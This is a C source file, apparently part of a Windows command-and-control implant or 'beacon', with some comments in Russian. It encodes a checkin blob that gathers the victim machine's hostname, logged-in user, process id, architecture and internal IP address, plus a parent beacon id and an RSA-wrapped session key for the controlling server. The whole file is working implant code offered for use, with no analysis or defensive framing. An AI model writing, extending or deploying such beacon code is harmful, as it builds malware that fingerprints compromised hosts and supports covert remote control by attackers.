// Fill the initial checkin metadata blob with host/user/pid/arch.
#include <winsock2.h>
#include <ws2tcpip.h>
#include "beacon.h"

// Thread-local-free kv encoder used here. Compatible with common/co2h/kv,
// but simplified for the beacon.

typedef struct KvBuf {
    uint8_t* buf;
    size_t   cap;
    size_t   off;   // reserved for count prefix
    size_t   pos;   // write head (after 2-byte count)
    uint16_t count;
} KvBuf;

static KvBuf g_kv;

static void w_u16(uint16_t v) {
    if (g_kv.pos + 2 > g_kv.cap) return;
    g_kv.buf[g_kv.pos++] = (uint8_t)(v >> 8);
    g_kv.buf[g_kv.pos++] = (uint8_t)v;
}

static void w_u32(uint32_t v) {
    if (g_kv.pos + 4 > g_kv.cap) return;
    g_kv.buf[g_kv.pos++] = (uint8_t)(v >> 24);
    g_kv.buf[g_kv.pos++] = (uint8_t)(v >> 16);
    g_kv.buf[g_kv.pos++] = (uint8_t)(v >> 8);
    g_kv.buf[g_kv.pos++] = (uint8_t)v;
}

static void w_bytes(const uint8_t* b, size_t n) {
    if (g_kv.pos + n > g_kv.cap) return;
    rt_memcpy(g_kv.buf + g_kv.pos, b, n);
    g_kv.pos += n;
}

void kv_reset(uint8_t* buf, size_t cap) {
    g_kv.buf = buf; g_kv.cap = cap;
    g_kv.pos = 2;   g_kv.count = 0;
}

void kv_put_str(const char* key, const char* val) {
    uint16_t kl = (uint16_t)rt_strlen(key);
    uint32_t vl = (uint32_t)rt_strlen(val);
    w_u16(kl); w_bytes((const uint8_t*)key, kl);
    w_u32(vl); w_bytes((const uint8_t*)val, vl);
    g_kv.count++;
}

void kv_put_bytes(const char* key, const uint8_t* val, uint32_t len) {
    uint16_t kl = (uint16_t)rt_strlen(key);
    w_u16(kl); w_bytes((const uint8_t*)key, kl);
    w_u32(len); w_bytes(val, len);
    g_kv.count++;
}

static void u32_to_dec(uint32_t v, char* out, size_t cap) {
    char tmp[16]; int i = 0;
    if (v == 0) { if (cap > 1) { out[0] = '0'; out[1] = 0; } return; }
    while (v && i < (int)sizeof(tmp)) { tmp[i++] = (char)('0' + v % 10); v /= 10; }
    int j = 0;
    while (i && j < (int)cap - 1) out[j++] = tmp[--i];
    out[j] = 0;
}

static void u64_to_dec(uint64_t v, char* out, size_t cap) {
    char tmp[24]; int i = 0;
    if (v == 0) { if (cap > 1) { out[0] = '0'; out[1] = 0; } return; }
    while (v && i < (int)sizeof(tmp)) { tmp[i++] = (char)('0' + v % 10); v /= 10; }
    int j = 0;
    while (i && j < (int)cap - 1) out[j++] = tmp[--i];
    out[j] = 0;
}

void kv_put_u32(const char* key, uint32_t v) {
    char s[16]; u32_to_dec(v, s, sizeof(s));
    kv_put_str(key, s);
}

void kv_put_u64(const char* key, uint64_t v) {
    char s[24]; u64_to_dec(v, s, sizeof(s));
    kv_put_str(key, s);
}

size_t kv_finish(uint8_t* out_count_prefix) {
    (void)out_count_prefix;
    g_kv.buf[0] = (uint8_t)(g_kv.count >> 8);
    g_kv.buf[1] = (uint8_t)(g_kv.count);
    return g_kv.pos;
}

// -- kv decoder ----------------------------------------------------------
int kv_find(const uint8_t* buf, size_t len, const char* key,
            const uint8_t** out_val, uint32_t* out_len) {
    if (len < 2) return 0;
    uint16_t n = ((uint16_t)buf[0] << 8) | buf[1];
    size_t off = 2;
    size_t klen = rt_strlen(key);
    for (uint16_t i = 0; i < n; ++i) {
        if (off + 2 > len) return 0;
        uint16_t kl = ((uint16_t)buf[off] << 8) | buf[off+1]; off += 2;
        if (off + kl > len) return 0;
        int match = (kl == (uint16_t)klen &&
                     rt_memcmp(buf + off, key, kl) == 0);
        off += kl;
        if (off + 4 > len) return 0;
        uint32_t vl = ((uint32_t)buf[off] << 24) | ((uint32_t)buf[off+1] << 16)
                    | ((uint32_t)buf[off+2] << 8) |  (uint32_t)buf[off+3];
        off += 4;
        if (off + vl > len) return 0;
        if (match) {
            if (out_val) *out_val = buf + off;
            if (out_len) *out_len = vl;
            return 1;
        }
        off += vl;
    }
    return 0;
}

int kv_get_str(const uint8_t* buf, size_t len, const char* key,
               char* out, size_t out_cap) {
    const uint8_t* v; uint32_t vl;
    if (!kv_find(buf, len, key, &v, &vl)) return 0;
    if (vl >= out_cap) vl = (uint32_t)out_cap - 1;
    rt_memcpy(out, v, vl); out[vl] = 0;
    return 1;
}

static uint64_t parse_u64(const uint8_t* s, uint32_t n) {
    uint64_t v = 0;
    for (uint32_t i = 0; i < n; ++i) {
        if (s[i] < '0' || s[i] > '9') break;
        v = v * 10 + (s[i] - '0');
    }
    return v;
}

int kv_get_u32(const uint8_t* buf, size_t len, const char* key, uint32_t* out) {
    const uint8_t* v; uint32_t vl;
    if (!kv_find(buf, len, key, &v, &vl)) return 0;
    *out = (uint32_t)parse_u64(v, vl); return 1;
}

int kv_get_u64(const uint8_t* buf, size_t len, const char* key, uint64_t* out) {
    const uint8_t* v; uint32_t vl;
    if (!kv_find(buf, len, key, &v, &vl)) return 0;
    *out = parse_u64(v, vl); return 1;
}

// -- metadata gatherer --------------------------------------------------
static void wcs_to_utf8(const wchar_t* ws, char* out, size_t cap) {
    int n = WideCharToMultiByte(CP_UTF8, 0, ws, -1, out, (int)cap, NULL, NULL);
    if (n <= 0 && cap) out[0] = 0;
}

size_t build_metadata(uint8_t* out, size_t cap,
                      const uint8_t* wrapped_key, uint32_t wrapped_key_len) {
    kv_reset(out, cap);

    wchar_t host_w[128]; DWORD hn = 128;
    if (!GetComputerNameW(host_w, &hn)) { host_w[0] = 0; }
    char host_utf8[256]; wcs_to_utf8(host_w, host_utf8, sizeof(host_utf8));
    kv_put_str("host", host_utf8);

    wchar_t user_w[128]; DWORD un = 128;
    if (!GetUserNameW(user_w, &un)) { user_w[0] = 0; }
    char user_utf8[256]; wcs_to_utf8(user_w, user_utf8, sizeof(user_utf8));
    kv_put_str("user", user_utf8);

    kv_put_u32("pid", GetCurrentProcessId());
#ifdef _WIN64
    kv_put_str("arch", "x64");
#else
    kv_put_str("arch", "x86");
#endif

    // Internal IP: первый не-loopback IPv4-адрес машины.
    {
        char ip_buf[64] = "";
        WSADATA wd_; WSAStartup(MAKEWORD(2, 2), &wd_); // безопасно вызывать несколько раз
        char hostname_[MAX_COMPUTERNAME_LENGTH + 2] = "";
        if (gethostname(hostname_, sizeof(hostname_)) == 0) {
            struct addrinfo hints_; rt_memset(&hints_, 0, sizeof(hints_));
            hints_.ai_family   = AF_INET;
            hints_.ai_socktype = SOCK_STREAM;
            struct addrinfo* res_ = NULL;
            if (getaddrinfo(hostname_, NULL, &hints_, &res_) == 0) {
                for (struct addrinfo* a_ = res_; a_; a_ = a_->ai_next) {
                    if (a_->ai_family != AF_INET) continue;
                    struct sockaddr_in* sin_ = (struct sockaddr_in*)a_->ai_addr;
                    uint32_t addr_ = ntohl(sin_->sin_addr.s_addr);
                    if ((addr_ >> 24) == 127) continue; // пропустить loopback
                    // форматируем A.B.C.D вручную (без CRT)
                    uint8_t b_[4];
                    b_[0] = (uint8_t)(addr_ >> 24);
                    b_[1] = (uint8_t)(addr_ >> 16);
                    b_[2] = (uint8_t)(addr_ >> 8);
                    b_[3] = (uint8_t)(addr_);
                    int pos_ = 0;
                    for (int i_ = 0; i_ < 4; i_++) {
                        if (i_ && pos_ < (int)sizeof(ip_buf) - 1)
                            ip_buf[pos_++] = '.';
                        uint8_t v_ = b_[i_];
                        if (!v_) {
                            if (pos_ < (int)sizeof(ip_buf) - 1) ip_buf[pos_++] = '0';
                        } else {
                            char t_[4]; int n_ = 0;
                            while (v_) { t_[n_++] = (char)('0' + v_ % 10); v_ /= 10; }
                            while (n_ && pos_ < (int)sizeof(ip_buf) - 1)
                                ip_buf[pos_++] = t_[--n_];
                        }
                    }
                    ip_buf[pos_] = 0;
                    break;
                }
                freeaddrinfo(res_);
            }
        }
        kv_put_str("ip", ip_buf);
    }

    // OS type
    kv_put_str("os", "windows");

    // Parent beacon id — set by artifact-gen when beacon is spawned by another beacon.
    BeaconState* st = beacon_state();
    if (st && st->parent_id[0]) {
        kv_put_str("parent_id", st->parent_id);
    }

    // RSA-OAEP-wrapped per-session AES key. Server unwraps with its private
    // blob and uses the plaintext as session_key; absent → server falls back
    // to listener_key (legacy beacon built without a baked-in pubkey).
    if (wrapped_key && wrapped_key_len > 0) {
        kv_put_bytes("wrapped_key", wrapped_key, wrapped_key_len);
    }

    return kv_finish(NULL);
}
